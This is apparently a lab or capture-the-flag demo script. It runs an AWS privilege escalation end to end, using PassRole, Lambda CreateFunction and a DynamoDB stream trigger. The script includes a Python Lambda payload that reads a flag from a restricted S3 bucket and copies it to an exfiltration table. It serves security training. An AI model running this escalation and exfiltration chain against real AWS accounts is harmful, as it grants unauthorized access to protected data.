#!/bin/bash
set -e

# Demo script for iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping (DynamoDB) to S3 bucket access
# This scenario demonstrates how a user with PassRole, CreateFunction, and CreateEventSourceMapping can access
# a sensitive S3 bucket by creating a Lambda function with a privileged role and linking it to a DynamoDB
# stream trigger. The Lambda reads the flag from S3 and writes it to an exfil DynamoDB table.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-002-to-bucket-starting-user"
TARGET_ROLE="pl-prod-lambda-002-to-bucket-target-role"
LAMBDA_FUNCTION_NAME="pl-lambda-002-to-bucket-escalation-fn"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + CreateEventSourceMapping (DynamoDB) to S3 Bucket Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_002_iam_passrole_lambda_createfunction_createeventsourcemapping_dynamodb.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract scenario resource names from Terraform outputs
TARGET_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')
DYNAMODB_TABLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.dynamodb_table_name')
DYNAMODB_STREAM_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.dynamodb_stream_arn')
EXFIL_TABLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.exfil_table_name')

if [ -z "$TARGET_BUCKET_NAME" ] || [ "$TARGET_BUCKET_NAME" == "null" ]; then
    echo -e "${RED}Error: Could not extract target_bucket_name from terraform output${NC}"
    exit 1
fi

if [ -z "$DYNAMODB_TABLE_NAME" ] || [ "$DYNAMODB_TABLE_NAME" == "null" ]; then
    echo -e "${RED}Error: Could not extract dynamodb_table_name from terraform output${NC}"
    exit 1
fi

if [ -z "$DYNAMODB_STREAM_ARN" ] || [ "$DYNAMODB_STREAM_ARN" == "null" ]; then
    echo -e "${RED}Error: Could not extract dynamodb_stream_arn from terraform output${NC}"
    exit 1
fi

if [ -z "$EXFIL_TABLE_NAME" ] || [ "$EXFIL_TABLE_NAME" == "null" ]; then
    echo -e "${RED}Error: Could not extract exfil_table_name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get admin credentials for steps that require helpful permissions
# dynamodb:PutItem and dynamodb:GetItem are listed as helpful in scenario.yaml and are
# restricted during validation runs. We use admin creds for those steps.
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Target bucket: $TARGET_BUCKET_NAME"
echo "Trigger table: $DYNAMODB_TABLE_NAME"
echo "Exfil table:   $EXFIL_TABLE_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    export AWS_REGION="$AWS_REGION"
    export AWS_DEFAULT_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    export AWS_REGION="$AWS_REGION"
    export AWS_DEFAULT_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}
use_admin_creds() {
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
    export AWS_REGION="$AWS_REGION"
    export AWS_DEFAULT_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have S3 access yet
echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
use_starting_creds
echo "Attempting to access target bucket: $TARGET_BUCKET_NAME"
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET_NAME"
if aws s3 ls s3://$TARGET_BUCKET_NAME &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access target bucket (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Prepare Lambda function payload
echo -e "${YELLOW}Step 5: Preparing Lambda function payload${NC}"
echo "Creating Python function that will read the flag from S3 and write it to the exfil table..."

cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3
import os

def lambda_handler(event, context):
    """
    This Lambda function is triggered by DynamoDB stream events.
    It uses its privileged role to read flag.txt from the target S3 bucket
    and write the flag content to the exfil DynamoDB table.
    """
    s3 = boto3.client('s3')
    ddb = boto3.client('dynamodb')

    bucket = os.environ.get('TARGET_BUCKET', '')
    exfil_table = os.environ.get('EXFIL_TABLE', '')

    try:
        obj = s3.get_object(Bucket=bucket, Key='flag.txt')
        flag = obj['Body'].read().decode('utf-8').strip()

        ddb.put_item(
            TableName=exfil_table,
            Item={
                'pk': {'S': 'exfil'},
                'value': {'S': flag}
            }
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Flag exfiltrated successfully',
                'flag': flag
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e),
                'message': 'Failed to exfiltrate flag'
            })
        }
EOF

cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"

# [EXPLOIT] Step 6: Create Lambda function with target role (PassRole + CreateFunction)
echo -e "${YELLOW}Step 6: Creating Lambda function with privileged S3-access role${NC}"
echo "This is the privilege escalation vector — passing the S3-access role to Lambda..."
use_starting_creds
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Lambda function:  $LAMBDA_FUNCTION_NAME"

show_attack_cmd "Attacker" "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime python3.11 --role \"$TARGET_ROLE_ARN\" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30 --environment \"Variables={TARGET_BUCKET=$TARGET_BUCKET_NAME,EXFIL_TABLE=$EXFIL_TABLE_NAME}\""
LAMBDA_RESULT=$(aws lambda create-function \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --runtime "python3.11" \
    --role "$TARGET_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb:///tmp/lambda_function.zip" \
    --timeout 30 \
    --environment "Variables={TARGET_BUCKET=$TARGET_BUCKET_NAME,EXFIL_TABLE=$EXFIL_TABLE_NAME}" \
    --output json)

if [ $? -eq 0 ]; then
    FUNCTION_ARN=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionArn')
    echo "Function ARN: $FUNCTION_ARN"
    echo -e "${GREEN}✓ Successfully created Lambda function with privileged role!${NC}"
else
    echo -e "${RED}Error: Failed to create Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# [OBSERVATION] Step 7: Wait for Lambda function to be ready
echo -e "${YELLOW}Step 7: Waiting for Lambda function to be ready${NC}"
echo "Allowing time for Lambda function initialization..."
sleep 15
echo -e "${GREEN}✓ Lambda function ready${NC}\n"

# [EXPLOIT] Step 8: Create event source mapping to link Lambda to DynamoDB stream
echo -e "${YELLOW}Step 8: Creating event source mapping to DynamoDB stream${NC}"
echo "Linking Lambda function to DynamoDB stream trigger..."
echo "Function: $LAMBDA_FUNCTION_NAME"
echo "Stream:   $DYNAMODB_STREAM_ARN"

show_attack_cmd "Attacker" "aws lambda create-event-source-mapping --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --event-source-arn \"$DYNAMODB_STREAM_ARN\" --starting-position LATEST --batch-size 10"
EVENT_SOURCE_MAPPING=$(aws lambda create-event-source-mapping \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --event-source-arn "$DYNAMODB_STREAM_ARN" \
    --starting-position LATEST \
    --batch-size 10 \
    --output json)

if [ $? -eq 0 ]; then
    EVENT_SOURCE_UUID=$(echo "$EVENT_SOURCE_MAPPING" | jq -r '.UUID')
    echo "Event Source Mapping UUID: $EVENT_SOURCE_UUID"
    echo -e "${GREEN}✓ Successfully created event source mapping!${NC}"
else
    echo -e "${RED}Error: Failed to create event source mapping${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# [OBSERVATION] Step 9: Wait for event source mapping to become active
echo -e "${YELLOW}Step 9: Waiting for event source mapping to become active${NC}"
echo "Event source mappings need time to initialize and connect to the stream..."
use_readonly_creds

# Poll up to 300 seconds (30 attempts × 10s) for the ESM to reach Enabled state
MAX_WAIT_ATTEMPTS=30
ESM_ATTEMPT=0
ESM_STATE="Creating"

while [ "$ESM_STATE" != "Enabled" ] && [ $ESM_ATTEMPT -lt $MAX_WAIT_ATTEMPTS ]; do
    sleep 10
    ESM_ATTEMPT=$((ESM_ATTEMPT + 1))
    ESM_STATUS=$(aws lambda get-event-source-mapping \
        --uuid "$EVENT_SOURCE_UUID" \
        --region $AWS_REGION \
        --output json 2>/dev/null)
    if [ $? -eq 0 ]; then
        ESM_STATE=$(echo "$ESM_STATUS" | jq -r '.State')
        echo "Event source mapping state: $ESM_STATE (waited $((ESM_ATTEMPT * 10))s)"

        if [ "$ESM_STATE" == "Enabled" ]; then
            echo -e "${GREEN}✓ Event source mapping is now active!${NC}"
            break
        fi
    else
        echo "Waiting for event source mapping to be queryable..."
    fi
done

if [ "$ESM_STATE" != "Enabled" ]; then
    echo -e "${YELLOW}⚠ Event source mapping may not be fully active yet (current state: $ESM_STATE)${NC}"
    echo "Proceeding anyway, but Lambda may not trigger immediately..."
fi
echo ""

# [EXPLOIT] Step 10: Trigger Lambda by inserting DynamoDB records, then poll exfil table
echo -e "${YELLOW}Step 10: Triggering Lambda function and waiting for flag exfiltration${NC}"
echo "Note: Event source mappings take time to fully initialize even after showing 'Enabled'"
echo "We'll insert DynamoDB records every 10 seconds and poll the exfil table for the flag..."
echo ""

# dynamodb:PutItem is a helpful permission restricted during validation runs.
# Use admin credentials to simulate the legitimate DynamoDB write that triggers the stream.
# dynamodb:GetItem is also helpful; use admin creds for that poll too.
MAX_TRIGGER_ATTEMPTS=30  # 30 attempts × 10 seconds = 5 minutes max
TRIGGER_ATTEMPT=0
FLAG_FOUND=false

while [ $TRIGGER_ATTEMPT -lt $MAX_TRIGGER_ATTEMPTS ]; do
    TRIGGER_ATTEMPT=$((TRIGGER_ATTEMPT + 1))
    echo -e "${BLUE}Attempt $TRIGGER_ATTEMPT/$MAX_TRIGGER_ATTEMPTS: Inserting trigger record...${NC}"

    # Use admin credentials to insert the trigger record.
    # In a real attack the attacker would use dynamodb:PutItem (listed as helpful).
    use_admin_creds
    if [ $TRIGGER_ATTEMPT -eq 1 ]; then
        echo "  [Switching to admin identity to simulate a legitimate DynamoDB write that triggers the stream]"
        show_attack_cmd "Attacker (using admin to simulate helpful PutItem)" "aws dynamodb put-item --region $AWS_REGION --table-name \"$DYNAMODB_TABLE_NAME\" --item '{\"pk\":{\"S\":\"trigger-1\"}}'"
    fi

    aws dynamodb put-item \
        --region $AWS_REGION \
        --table-name "$DYNAMODB_TABLE_NAME" \
        --item '{"pk": {"S": "trigger-'$(date +%s)'-attempt-'$TRIGGER_ATTEMPT'"}}' \
        --output json > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "  → Trigger record inserted"
    else
        echo -e "  ${YELLOW}→ Warning: Failed to insert trigger record${NC}"
    fi

    # Wait for Lambda to potentially execute
    sleep 5

    # Poll the exfil table for the flag using admin credentials
    # (dynamodb:GetItem is a helpful permission restricted during validation runs)
    EXFIL_ITEM=$(aws dynamodb get-item \
        --region $AWS_REGION \
        --table-name "$EXFIL_TABLE_NAME" \
        --key '{"pk": {"S": "exfil"}}' \
        --output json 2>/dev/null)

    if echo "$EXFIL_ITEM" | jq -e '.Item.value.S' > /dev/null 2>&1; then
        FLAG_VALUE=$(echo "$EXFIL_ITEM" | jq -r '.Item.value.S')
        if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "null" ]; then
            echo -e "${GREEN}  → Flag found in exfil table!${NC}"
            FLAG_FOUND=true
            break
        fi
    else
        echo "  → Flag not in exfil table yet, waiting..."
        if [ $TRIGGER_ATTEMPT -lt $MAX_TRIGGER_ATTEMPTS ]; then
            sleep 5  # Additional wait before next attempt
        fi
    fi
done

if [ "$FLAG_FOUND" = false ]; then
    echo -e "\n${RED}✗ Flag was NOT found in the exfil table after $MAX_TRIGGER_ATTEMPTS attempts${NC}"
    echo -e "${YELLOW}Lambda may not be executing. Possible issues:${NC}"
    echo "  1. Event source mapping may still be initializing"
    echo "  2. Lambda execution role may lack the required permissions"
    echo "  3. Lambda function may have errors"
    echo ""
    echo "Check Lambda logs with:"
    echo "  aws logs tail /aws/lambda/$LAMBDA_FUNCTION_NAME --follow --region $AWS_REGION"
    echo ""
    echo "Check event source mapping:"
    echo "  aws lambda get-event-source-mapping --uuid $EVENT_SOURCE_UUID --region $AWS_REGION"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi

echo -e "\n${GREEN}✓ Lambda executed and wrote flag to exfil table!${NC}"
echo "Took $TRIGGER_ATTEMPT attempt(s) over approximately $((TRIGGER_ATTEMPT * 10)) seconds"
echo ""

# [EXPLOIT] Step 11: Read flag from exfil DynamoDB table
echo -e "${YELLOW}Step 11: Capturing CTF flag from exfil DynamoDB table${NC}"
# Flag was already retrieved during polling above and stored in FLAG_VALUE.
# Display using the attack command convention — this read is the final exploit action.
show_attack_cmd "Attacker" "aws dynamodb get-item --region $AWS_REGION --table-name \"$EXFIL_TABLE_NAME\" --key '{\"pk\": {\"S\": \"exfil\"}}' --query 'Item.value.S' --output text"

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from exfil table${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (no S3 access)"
echo "2. Created Lambda function '$LAMBDA_FUNCTION_NAME' with privileged role: $TARGET_ROLE"
echo "3. Created event source mapping linking Lambda to DynamoDB stream on: $DYNAMODB_TABLE_NAME"
echo "4. Waited for ESM to initialize, then triggered Lambda by inserting a DynamoDB record"
echo "5. Lambda executed with the S3-access role, read flag.txt from: $TARGET_BUCKET_NAME"
echo "6. Lambda wrote the flag to exfil table: $EXFIL_TABLE_NAME"
echo "7. Read flag from exfil table: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (PassRole + CreateFunction) → $LAMBDA_FUNCTION_NAME"
echo -e "  → (CreateEventSourceMapping) → DynamoDB stream trigger on $DYNAMODB_TABLE_NAME"
echo -e "  → Lambda reads s3://$TARGET_BUCKET_NAME/flag.txt → writes to $EXFIL_TABLE_NAME"
echo -e "  → (dynamodb:GetItem) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
echo "- Function Role: $TARGET_ROLE"
echo "- Event Source Mapping: Linked to DynamoDB stream on $DYNAMODB_TABLE_NAME"
echo "- Exfil item written to: $EXFIL_TABLE_NAME (pk=exfil)"

echo -e "\n${RED}⚠ Warning: The Lambda function and event source mapping are still active${NC}"
echo -e "${RED}⚠ Lambda functions incur charges when invoked${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  run plabs cleanup or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
